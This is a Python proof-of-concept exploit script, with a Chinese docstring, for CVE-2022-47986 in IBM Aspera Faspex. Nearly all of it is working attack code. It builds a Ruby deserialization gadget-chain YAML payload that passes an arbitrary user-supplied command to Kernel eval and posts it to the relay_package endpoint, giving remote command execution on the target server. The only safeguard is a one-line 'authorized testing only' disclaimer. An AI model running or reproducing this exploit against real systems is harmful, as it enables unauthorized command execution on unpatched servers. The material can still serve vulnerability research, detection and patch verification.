
"""
Aspera Faspex CVE-2022-47986 POC 检测脚本

漏洞描述:
IBM Aspera Faspex 存在反序列化漏洞(CVE-2022-47986)。
攻击者可以通过发送恶意的 YAML payload 来执行任意 Ruby 代码。

影响版本:
- IBM Aspera Faspex 4.x
- IBM Aspera Faspex 5.x

检测原理:
通过向 /aspera/faspex/package_relay/relay_package 端点发送
包含恶意 Ruby 反序列化 payload 的 YAML 数据,尝试执行命令。

使用方法:
    python CVE-2022-47986.py http://127.0.0.1 "whoami"

参数说明:
    第一个参数:目标URL
    第二个参数:要执行的命令

返回值:
    打印服务器响应

注意:
    此POC仅用于安全测试和授权的渗透测试,请勿用于非法用途。
"""

import requests


def check_vulnerability(target_url: str, command: str = "whoami") -> dict:
    """
    检测目标是否存在 CVE-2022-47986 漏洞
    
    Args:
        target_url: 目标URL
        command: 要执行的命令
        
    Returns:
        dict: 包含检测结果的字典
    """
    url = "{}/aspera/faspex/package_relay/relay_package".format(target_url.rstrip('/'))
    
    uuid = "d7cb6601-6db9-43aa-8e6b-dfb4768647ec"
    
    exploit_yaml = """
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "pew"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:PrettyPrint
             output: !ruby/object:Net::WriteAdapter
                 socket: &1 !ruby/module "Kernel"
                 method_id: :eval
             newline: "throw `CMD`"
             buffer: {}
             group_stack:
              - !ruby/object:PrettyPrint::Group
                break: true
         method_id: :breakable
""".replace("CMD", command)
    
    payload = {
        "package_file_list": ["/"],
        "external_emails": exploit_yaml,
        "package_name": "assetnote_pack",
        "package_note": "hello from assetnote team",
        "original_sender_name": "assetnote",
        "package_uuid": uuid,
        "metadata_human_readable": "Yes",
        "forward": "pew",
        "metadata_json": '{}',
        "delivery_uuid": uuid,
        "delivery_sender_name": "assetnote",
        "delivery_title": "TEST",
        "delivery_note": "TEST",
        "delete_after_download": True,
        "delete_after_download_condition": "IDK",
    }
    
    try:
        r = requests.post(url, json=payload, verify=False, timeout=10)
        return {
            "success": True,
            "status_code": r.status_code,
            "response": r.text[:500],
            "vulnerable": r.status_code == 200
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }


def poc(target: str) -> dict:
    """
    POC入口函数
    
    Args:
        target: 目标URL
        
    Returns:
        dict: 检测结果
    """
    return check_vulnerability(target)


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python CVE_2022_47986.py <target_url> [command]")
        sys.exit(1)
    
    target_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "whoami"
    
    result = check_vulnerability(target_url, command)
    print(result)
